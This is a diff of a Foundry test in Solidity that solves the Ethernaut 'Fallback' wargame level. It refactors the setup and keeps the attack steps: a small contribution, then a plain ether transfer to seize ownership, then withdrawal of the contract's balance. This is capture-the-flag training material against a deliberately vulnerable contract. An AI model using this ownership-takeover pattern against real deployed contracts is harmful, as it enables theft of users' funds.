@@ -2,8 +2,6 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import {Ethernaut} from "src/Ethernaut.sol";
-import {Statistics} from "src/metrics/Statistics.sol";
 import {FallbackFactory} from "src/levels/FallbackFactory.sol";
 
 interface IFallback {
@@ -13,60 +11,42 @@ interface IFallback {
 }
 
 contract FallbackTest is Test {
-    Ethernaut public ethernaut;
     FallbackFactory public level;
+    IFallback public target;
+    address public player;
 
     function setUp() public {
         // ----------------------------------
-        // Deploy Ethernaut contract
-        // ----------------------------------
-        Statistics statistics = new Statistics();
-        ethernaut = new Ethernaut();
-        statistics.initialize(address(ethernaut));
-        ethernaut.setStatistics(address(statistics));
-
-        // ----------------------------------
-        // Register level
+        // Create level instance
         // ----------------------------------
         level = new FallbackFactory();
-        ethernaut.registerLevel(level);
+        player = makeAddr("PLAYER");
+        target = IFallback(level.createInstance(player));
+
+        vm.deal(address(target), 1000 ether);
+        vm.deal(player, 1 ether);
     }
 
     function test_Fallback() public {
-        address PLAYER = makeAddr("PLAYER");
-        IFallback target;
-
-        vm.startPrank(PLAYER);
-        vm.recordLogs();
-
-        // ----------------------------------
-        // Create level instance
-        // ----------------------------------
-        ethernaut.createLevelInstance(level);
-        Vm.Log[] memory entries = vm.getRecordedLogs();
-        target = IFallback(
-            payable(address(uint160(uint256(entries[0].topics[2]))))
-        );
-
         // ----------------------------------
         // Initiate attack
         // ----------------------------------
-        vm.deal(address(target), 1000 ether);
-        vm.deal(PLAYER, 1 ether);
+        vm.startPrank(player);
 
         target.contribute{value: 1}();
 
         // Invoke receive function
-        (bool success, ) = payable(address(target)).call{value: 1}("");
-        require(success, "tx failed");
+        (bool sent, ) = payable(address(target)).call{value: 1}("");
+        require(sent, "tx failed");
 
         target.withdraw();
+
+        vm.stopPrank();
 
         // ----------------------------------
         // Validate
         // ----------------------------------
-        ethernaut.submitLevelInstance(payable(address(target)));
-        entries = vm.getRecordedLogs();
-        assertEq(entries.length, 2);
+        bool success = level.validateInstance(payable(address(target)), player);
+        assertEq(success, true);
     }
 }
